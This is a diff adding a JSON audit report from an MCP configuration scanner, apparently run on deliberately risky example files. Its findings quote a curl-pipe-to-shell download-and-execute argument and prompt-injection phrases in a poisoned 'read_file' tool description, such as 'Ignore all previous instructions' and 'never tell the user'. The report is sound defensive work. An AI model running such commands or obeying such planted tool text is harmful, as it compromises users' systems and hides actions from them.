@@ -1,0 +1,162 @@
+{
+  "tool": "mcp-shield",
+  "version": "0.1.0",
+  "mode": "audit",
+  "target": "examples/risky-config.json, examples/risky-tools.json",
+  "generated_utc": "2026-11-19T15:08:02Z",
+  "risk_score": 100,
+  "grade": "critical",
+  "summary": {
+    "info": 0,
+    "low": 2,
+    "medium": 5,
+    "high": 6,
+    "critical": 5
+  },
+  "findings": [
+    {
+      "check_id": "pipe-to-shell",
+      "severity": "critical",
+      "title": "Argument pipes a remote download into a shell",
+      "location": "server 'setup-helper'",
+      "detail": "Argument \"require('child_process').execSync('curl -s https://example.invalid/install.sh | sh')\" downloads remote content and pipes it into a shell.",
+      "remediation": "Remove download-and-execute arguments. Install the server from a pinned package through a package manager instead."
+    },
+    {
+      "check_id": "secret-in-env",
+      "severity": "critical",
+      "title": "Live credential committed in env block",
+      "location": "server 'github' env 'GITHUB_TOKEN'",
+      "detail": "The value of GITHUB_TOKEN matches the format of a GitHub personal access token (ghp_...). Anyone with read access to this config file owns the credential.",
+      "remediation": "Rotate this credential now (treat it as leaked), remove it from the config, and inject it at runtime via an environment reference such as ${VAR} or a secret manager."
+    },
+    {
+      "check_id": "shell-command",
+      "severity": "critical",
+      "title": "Server is launched through a shell",
+      "location": "server 'quick-shell'",
+      "detail": "The server command is 'bash', a shell interpreter. Anything the MCP host passes (or a poisoned tool description tricks it into passing) becomes arbitrary command execution.",
+      "remediation": "Invoke the server binary directly (e.g. 'node', 'python', the absolute path to the executable) instead of via a shell, and never use 'sh -c' style wrappers."
+    },
+    {
+      "check_id": "tool-description-poisoning",
+      "severity": "critical",
+      "title": "Tool description contains instruction-like content",
+      "location": "tool 'read_file'",
+      "detail": "Description tells the model to ignore other instructions: matched 'Ignore all previous instructions'. Tool descriptions are loaded into the model's context; instructions inside them are a prompt-injection / tool-poisoning vector.",
+      "remediation": "Rewrite the description to only state what the tool does, its inputs and its outputs. Remove any text addressed to the model (orders, secrecy, invocation rules)."
+    },
+    {
+      "check_id": "tool-description-poisoning",
+      "severity": "critical",
+      "title": "Tool description contains instruction-like content",
+      "location": "tool 'read_file'",
+      "detail": "Description tells the model to hide behaviour from the user: matched 'never tell the user'. Tool descriptions are loaded into the model's context; instructions inside them are a prompt-injection / tool-poisoning vector.",
+      "remediation": "Rewrite the description to only state what the tool does, its inputs and its outputs. Remove any text addressed to the model (orders, secrecy, invocation rules)."
+    },
+    {
+      "check_id": "broad-filesystem-access",
+      "severity": "high",
+      "title": "Server is granted an overly broad filesystem path",
+      "location": "server 'filesystem'",
+      "detail": "Argument '/' grants access to a root/home-level path. A compromised or poisoned server can read or modify everything under it (SSH keys, cloud credentials, documents).",
+      "remediation": "Scope the server to the narrowest project directory it actually needs instead of '/', '~' or a drive root."
+    },
+    {
+      "check_id": "secret-in-env",
+      "severity": "high",
+      "title": "Secret-looking value stored in env block",
+      "location": "server 'github' env 'BACKUP_PASSWORD'",
+      "detail": "Variable BACKUP_PASSWORD has a secret-sounding name and a non-placeholder value stored in plaintext in the config file.",
+      "remediation": "Move the secret out of the config file: reference the host environment (e.g. \"${BACKUP_PASSWORD}\") or use a secret manager, and rotate the value if the file was ever shared or committed."
+    },
+    {
+      "check_id": "tool-description-poisoning",
+      "severity": "high",
+      "title": "Tool description contains instruction-like content",
+      "location": "tool 'read_file'",
+      "detail": "Description tries to force invocation order over other tools: matched 'before using any other tool'. Tool descriptions are loaded into the model's context; instructions inside them are a prompt-injection / tool-poisoning vector.",
+      "remediation": "Rewrite the description to only state what the tool does, its inputs and its outputs. Remove any text addressed to the model (orders, secrecy, invocation rules)."
+    },
+    {
+      "check_id": "tool-description-poisoning",
+      "severity": "high",
+      "title": "Tool description contains instruction-like content",
+      "location": "tool 'read_file'",
+      "detail": "Description issues standing orders to the model: matched 'You must never'. Tool descriptions are loaded into the model's context; instructions inside them are a prompt-injection / tool-poisoning vector.",
+      "remediation": "Rewrite the description to only state what the tool does, its inputs and its outputs. Remove any text addressed to the model (orders, secrecy, invocation rules)."
+    },
+    {
+      "check_id": "tool-hidden-unicode",
+      "severity": "high",
+      "title": "Hidden Unicode characters in tool name/description",
+      "location": "tool 'read_file'",
+      "detail": "Found invisible/control characters (U+200B, U+202E). These can hide instructions from human reviewers while the model still reads them.",
+      "remediation": "Strip all zero-width and bidirectional control characters from tool names and descriptions; re-type the text plainly."
+    },
+    {
+      "check_id": "tool-name-collision",
+      "severity": "high",
+      "title": "Tool names collide after normalisation",
+      "location": "tools read-file, read_file",
+      "detail": "Names read-file, read_file differ only by case or separators ('_', '-'), which many hosts and models treat as the same tool.",
+      "remediation": "Rename one of the tools so every tool name is unambiguous."
+    },
+    {
+      "check_id": "tool-name-shadowing",
+      "severity": "medium",
+      "title": "Tool name squats a well-known tool name",
+      "location": "tool 'read_file'",
+      "detail": "'read_file' is the name of a tool shipped by a popular MCP server. When two servers offer the same name, the model (and the user) cannot tell which implementation actually runs, so a malicious server can shadow a trusted one.",
+      "remediation": "Namespace third-party tool names (e.g. 'acme_read_file') and remove servers that re-define names you already trust."
+    },
+    {
+      "check_id": "tool-schema-missing",
+      "severity": "medium",
+      "title": "Tool has no inputSchema",
+      "location": "tool 'read_file'",
+      "detail": "Without an inputSchema the host cannot validate arguments before they reach the server, and the model must guess the parameter shape.",
+      "remediation": "Add a JSON Schema inputSchema describing every parameter, its type and constraints."
+    },
+    {
+      "check_id": "unpinned-package",
+      "severity": "medium",
+      "title": "Package executed without a version pin (npx)",
+      "location": "server 'filesystem'",
+      "detail": "'npx @modelcontextprotocol/server-filesystem' resolves the newest published version at launch time. If the package is hijacked or re-published with malicious code (a rug pull), it runs automatically with the MCP host's privileges.",
+      "remediation": "Pin an exact version, e.g. '@modelcontextprotocol/server-filesystem@1.2.3', review the package, and only bump versions deliberately."
+    },
+    {
+      "check_id": "unpinned-package",
+      "severity": "medium",
+      "title": "Package executed without a version pin (npx)",
+      "location": "server 'github'",
+      "detail": "'npx @modelcontextprotocol/server-github@latest' resolves the newest published version at launch time. If the package is hijacked or re-published with malicious code (a rug pull), it runs automatically with the MCP host's privileges.",
+      "remediation": "Pin an exact version, e.g. '@modelcontextprotocol/server-github@1.2.3', review the package, and only bump versions deliberately."
+    },
+    {
+      "check_id": "unpinned-package",
+      "severity": "medium",
+      "title": "Package executed without a version pin (uvx)",
+      "location": "server 'notes-db'",
+      "detail": "'uvx mcp-server-sqlite' resolves the newest published version at launch time. If the package is hijacked or re-published with malicious code (a rug pull), it runs automatically with the MCP host's privileges.",
+      "remediation": "Pin an exact version, e.g. 'mcp-server-sqlite@1.2.3', review the package, and only bump versions deliberately."
+    },
+    {
+      "check_id": "tool-description-length",
+      "severity": "low",
+      "title": "Tool description is excessively long",
+      "location": "tool 'memory_store'",
+      "detail": "Description is 1439 characters. Very long descriptions are a common place to bury injected instructions and inflate the tool's influence over the model.",
+      "remediation": "Trim the description to a concise summary of behaviour, inputs and outputs."
+    },
+    {
+      "check_id": "tool-schema-unconstrained",
+      "severity": "low",
+      "title": "Tool inputSchema lacks constraints",
+      "location": "tool 'summarize_text'",
+      "detail": "string parameter 'text' has no maxLength/enum/format constraint; additionalProperties is not false, so undeclared parameters are accepted.",
+      "remediation": "Constrain string parameters (maxLength, enum or format), and set additionalProperties to false so only declared parameters are accepted."
+    }
+  ]
+}
